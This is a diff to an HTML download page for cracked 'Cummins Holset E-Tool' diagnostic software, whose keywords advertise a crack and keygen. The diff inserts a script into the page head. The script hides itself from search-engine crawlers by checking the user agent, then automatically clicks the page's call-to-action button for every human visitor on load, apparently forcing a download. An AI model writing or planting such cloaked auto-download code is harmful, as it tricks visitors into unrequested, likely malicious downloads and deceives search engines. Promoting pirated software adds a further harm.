@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Cummins Holset E-Tool v1.13 2024</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download Cummins Holset E-Tool v1.13 2024 for diagnostics and calibration of Holset VGT Electric Actuators. Supports Windows 10/11">
     <meta name="keywords" content="Cummins Holset E-Tool v1.13 2024, Cummins Holset E-Tool download 2024, Cummins Holset E-Tool free download, Cummins Holset E-Tool diagnostic software, Holset VGT Electric Actuators diagnostics, Holset E-Tool calibration, Cummins diagnostic tool v1.13, Holset turbocharger tool, Cummins Holset E-Tool crack, Cummins Holset E-Tool keygen, Cummins Inline 6 diagnostics, NEXIQ USB-Link 2 support, DLA+ 2.0 diagnostics, DPA5 PRO support, Cummins Holset E-Tool Windows 10, Cummins Holset E-Tool Windows 11, Cummins Holset E-Tool manual, Cummins Holset E-Tool русский, Cummins Holset E-Tool скачать, Cummins Holset E-Tool бесплатно скачать, Cummins диагностика, Cummins Holset E-Tool Free Download, Cummins Holset E-Tool Diagnostic Software, Cummins Holset E-Tool Cracked">
     <style>
